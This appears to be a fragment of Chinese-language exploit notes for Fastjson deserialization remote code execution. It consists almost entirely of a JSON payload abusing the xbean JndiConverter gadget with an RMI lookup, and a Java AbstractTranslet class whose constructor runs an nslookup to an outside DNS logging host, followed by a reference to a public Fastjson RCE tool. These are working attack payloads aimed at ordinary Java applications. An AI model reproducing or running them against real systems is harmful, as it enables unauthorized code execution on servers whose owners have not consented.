...
```language--json
["@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://dnlog/exploit"]
```
...
public class T extends AbstractTranslet {
    public T() throws IOException {
        Runtime.getRuntime().exec("nslookup 9aklb11e3qti173clcwl8k89c0iq6f.x.r0xe.com");
    }
...
* 使用 https://github.com/wyzxxz/fastjson_rce_tool 项目
